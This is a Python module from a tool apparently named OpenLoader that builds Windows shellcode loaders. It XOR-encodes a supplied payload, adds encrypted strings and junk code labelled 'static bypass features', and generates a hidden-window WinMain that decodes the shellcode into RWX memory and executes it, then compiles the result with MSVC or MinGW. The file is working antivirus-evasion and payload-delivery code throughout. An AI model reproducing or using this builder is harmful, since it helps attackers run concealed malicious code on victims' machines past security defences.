"""
compiler.py — Config → C++ source → compile.
Đọc config, generate C++ loader source với static bypass features,
rồi compile bằng CMake hoặc MSVC trực tiếp.
"""

import os
import struct
import random
import string
from pathlib import Path
from typing import Optional

from .config import Config
from .encoder import get_encoder, parse_key, generate_random_key


PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent.parent
CPP_DIR = PROJECT_ROOT / "cpp"
BUILD_DIR = PROJECT_ROOT / "build"
SHELLCODE_DIR = PROJECT_ROOT / "shellcode"

# ============================================================
# Shellcode auto-find
# ============================================================

def find_shellcode(input_path: Optional[str] = None) -> Optional[Path]:
    """
    Tìm shellcode file.
    Nếu -i (--input) có → dùng file đó.
    Nếu không → tự tìm trong shellcode/ folder.
    """
    if input_path:
        p = Path(input_path)
        if p.exists():
            return p
        print(f"[!] Input file not found: {p}")
        return None

    # Auto-find in shellcode/ folder
    if not SHELLCODE_DIR.exists():
        print(f"[!] Shellcode directory not found: {SHELLCODE_DIR}")
        return None

    # Find first .bin, .shc, .raw, .dll, .exe in shellcode/
    extensions = ["*.bin", "*.shc", "*.raw", "*.dll", "*.exe"]
    found = []
    for ext in extensions:
        found.extend(SHELLCODE_DIR.glob(ext))

    if not found:
        print(f"[!] No shellcode files found in {SHELLCODE_DIR}")
        print(f"    Supported: {', '.join(extensions)}")
        return None

    # Return first found
    print(f"[*] Auto-found shellcode: {found[0]}")
    return found[0]


# ============================================================
# C++ Source Generation
# ============================================================

def generate_encryption_header(config: Config, shared_key: Optional[bytes] = None) -> str:
    """Generate C++ header cho encryption decoder.
    If shared_key is provided, use it; otherwise generate a new one."""
    enc = config.static.get("encryption", {})
    if not enc.get("enabled"):
        return "// Encryption: DISABLED\n"

    algo = enc.get("algorithm", "xor")

    if algo == "xor":
        if shared_key is not None:
            key = shared_key
        else:
            key_str = enc.get("key", "random")
            key = parse_key(key_str, 16)
        key_array = ", ".join(f"0x{b:02x}" for b in key)
        return f"""
// Encryption: XOR (key = embedded)
static const unsigned char XOR_KEY[] = {{{key_array}}};
static const int XOR_KEY_LEN = {len(key)};

void xor_decode(unsigned char* data, int len) {{
    for (int i = 0; i < len; i++) {{
        data[i] ^= XOR_KEY[i % XOR_KEY_LEN];
    }}
}}
"""
    elif algo == "aes":
        # PSEUDO: AES decode trong C++ cần OpenSSL or embedded AES
        return """
// Encryption: AES-128-CBC
// TODO: implement AES decryption (need AES library or embedded implementation)
// void aes_decode(unsigned char* data, int len, unsigned char* key) { ... }
"""
    return ""


def generate_string_encryption_header(config: Config) -> str:
    """Generate C++ header cho string encryption."""
    str_enc = config.static.get("string_encryption", {})
    if not str_enc.get("enabled"):
        return "// String encryption: DISABLED\n"

    algo = str_enc.get("algorithm", "xor")
    key_str = str_enc.get("key", "random")
    key = parse_key(key_str, 16)

    key_array = ", ".join(f"0x{b:02x}" for b in key)

    return f"""
// String Encryption: {algo.upper()}
static const unsigned char STR_KEY[] = {{{key_array}}};
static const int STR_KEY_LEN = {len(key)};

// Macro để decrypt string tại runtime
#define S(encrypted) decrypt_string(encrypted, sizeof(encrypted) - 1)

const char* decrypt_string(const unsigned char* enc, int len) {{
    static char buf[256];
    for (int i = 0; i < len && i < 255; i++) {{
        buf[i] = enc[i] ^ STR_KEY[i % STR_KEY_LEN];
    }}
    buf[len] = 0;
    return buf;
}}
"""


def generate_dead_code(config: Config) -> str:
    """Generate dead code injection functions."""
    dead = config.static.get("dead_code", {})
    if not dead.get("enabled"):
        return "// Dead code: DISABLED\n"

    density = dead.get("density", "medium")
    code_type = dead.get("type", "nop")

    # Số lượng junk instructions theo density
    counts = {"low": 5, "medium": 20, "high": 50}
    count = counts.get(density, 20)

    lines = ["// Dead code injection"]
    lines.append(f"// Density: {density}, Type: {code_type}")

    if code_type in ("nop", "mixed"):
        lines.append("void inject_nop_sled(unsigned char* buf, int count) {")
        lines.append("    for (int i = 0; i < count; i++) {")
        lines.append('        buf[i] = 0x90; // NOP')
        lines.append("    }")
        lines.append("}")

    if code_type in ("junk", "mixed"):
        lines.append("void inject_junk_code() {")
        lines.append("    // PSEUDO: inserted junk instructions that look legitimate")
        junk_insns = [
            "volatile int x_{i} = 0; x_{i} += 1;",    # mov eax, 0; add eax, 1
            "volatile int y_{i} = 1; y_{i} *= 2;",    # mov eax, 1; imul eax, 2
            "volatile int z_{i} = 0; z_{i} ^= z_{i};",  # xor eax, eax
            "__asm__ __volatile__(\"nop\");",             # NOP via inline asm
        ]
        for i in range(count):
            insn = random.choice(junk_insns).format(i=i)
            lines.append(f"    {insn} // junk_{i}")
        lines.append("}")

    return "\n".join(lines) + "\n"


def generate_loader_source(config: Config, shellcode_bytes: Optional[bytes] = None) -> str:
    """Generate toàn bộ C++ loader source từ config."""
    parts = []

    # Generate encryption key ONCE here, reuse for both header and encoding
    enc_cfg = config.static.get("encryption", {})
    shared_key = None
    if enc_cfg.get("enabled") and shellcode_bytes:
        key_str = enc_cfg.get("key", "random")
        shared_key = parse_key(key_str, 16)

    # Header
    parts.append(f"""/**
 * AUTO-GENERATED by OpenLoader Python builder
 * Config: {config.path.name}
 *
 * Static bypass features:
 *   Encryption:       {config.get('static', 'encryption', 'enabled', default=False)}
 *   String Encryption: {config.get('static', 'string_encryption', 'enabled', default=False)}
 *   Dead Code:        {config.get('static', 'dead_code', 'enabled', default=False)}
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <cstdint>
#include <cstring>
""")

    # Encryption decoder (use shared_key if available)
    parts.append(generate_encryption_header(config, shared_key))

    # String encryption
    parts.append(generate_string_encryption_header(config))

    # Dead code
    parts.append(generate_dead_code(config))

    # Shellcode bytes (embedded)
    if shellcode_bytes:
        # Apply encoding with the SAME shared_key
        if shared_key is not None:
            encoder = get_encoder(enc_cfg.get("algorithm", "xor"), shared_key)
            shellcode_bytes = encoder.encode(shellcode_bytes)

        sc_array = ", ".join(f"0x{b:02x}" for b in shellcode_bytes)
        parts.append(f"""
// Encoded shellcode ({len(shellcode_bytes)} bytes)
static unsigned char encoded_sc[] = {{{sc_array}}};
static int encoded_sc_len = {len(shellcode_bytes)};
""")

    # Main loader function (Windows subsystem - no console window)
    enc_enabled = config.static.get("encryption", {}).get("enabled", False)
    decode_call = "    xor_decode(encoded_sc, encoded_sc_len);\n" if enc_enabled else ""

    parts.append(f"""
// ============================================================
// Main loader (Windows subsystem - no console window)
// ============================================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {{
    // 1. Decrypt shellcode (if encrypted)
    // 2. Allocate RWX memory
    // 3. Copy decoded shellcode
    // 4. Execute

{decode_call}
    // Allocate executable memory
    void* exec_mem = VirtualAlloc(
        NULL, encoded_sc_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!exec_mem) {{
        return 1;
    }}

    // Copy shellcode to executable memory
    memcpy(exec_mem, encoded_sc, encoded_sc_len);

    // Flush instruction cache
    FlushInstructionCache(GetCurrentProcess(), exec_mem, encoded_sc_len);

    // Execute shellcode
    ((void(*)())exec_mem)();

    return 0;
}}
""")

    return "\n".join(parts)


# ============================================================
# Compilation
# ============================================================

def compile_msvc(source_path: Path, output_path: Path, config: Config) -> int:
    """Compile bằng MSVC (cl.exe)."""
    cmd = [
        "cl.exe",
        "/nologo",
        "/O2",               # Optimize for speed
        "/MT",               # Static CRT
        "/EHsc",             # C++ exceptions
        f"/Fe:{output_path}",
        str(source_path),
        "/link",
        "/SUBSYSTEM:CONSOLE",
    ]
    print(f"[*] MSVC: {' '.join(cmd)}")
    result = os.system(" ".join(str(c) for c in cmd))
    return result


def compile_gcc(source_path: Path, output_path: Path, config: Config) -> int:
    """Compile bằng MinGW cross-compiler (Windows subsystem - no console)."""
    cmd = [
        "x86_64-w64-mingw32-g++",
        "-O2",
        "-static",
        "-mwindows",           # Windows subsystem (no console window)
        "-o", str(output_path),
        str(source_path),
        "-luser32",
    ]
    print(f"[*] MinGW: {' '.join(cmd)}")
    result = os.system(" ".join(cmd))
    return result


def compile_from_config(config: Config, input_path: Optional[str] = None,
                         output_path: Optional[str] = None,
                         output_format: Optional[str] = None) -> int:
    """
    Main compile pipeline:
    1. Find shellcode
    2. Generate C++ source
    3. Compile
    """
    # Find shellcode
    sc_path = find_shellcode(input_path)
    sc_bytes = sc_path.read_bytes() if sc_path else None

    # Determine output
    fmt = output_format or config.output.get("format", "exe")
    filename = output_path or config.output.get("filename", "loader")

    # Auto-add extension
    if not filename.endswith(f".{fmt}"):
        filename = f"{filename}.{fmt}"

    BUILD_DIR.mkdir(parents=True, exist_ok=True)
    out_path = BUILD_DIR / filename
    src_path = BUILD_DIR / "loader_generated.cpp"

    # Generate C++ source
    print(f"[*] Generating C++ source: {src_path}")
    source = generate_loader_source(config, sc_bytes)
    src_path.write_text(source)

    # Compile
    compiler = config.get("build", "compiler", default="msvc")
    print(f"[*] Compiling with: {compiler}")

    if compiler == "msvc":
        ret = compile_msvc(src_path, out_path, config)
    else:
        ret = compile_gcc(src_path, out_path, config)

    if ret == 0:
        # Copy to output/ folder
        output_dir = PROJECT_ROOT / "output"
        output_dir.mkdir(parents=True, exist_ok=True)
        final_output = output_dir / out_path.name
        import shutil
        shutil.copy2(out_path, final_output)
        print(f"\n[+] Build successful: {final_output}")
    else:
        print(f"\n[!] Build failed (exit code: {ret})")

    return ret
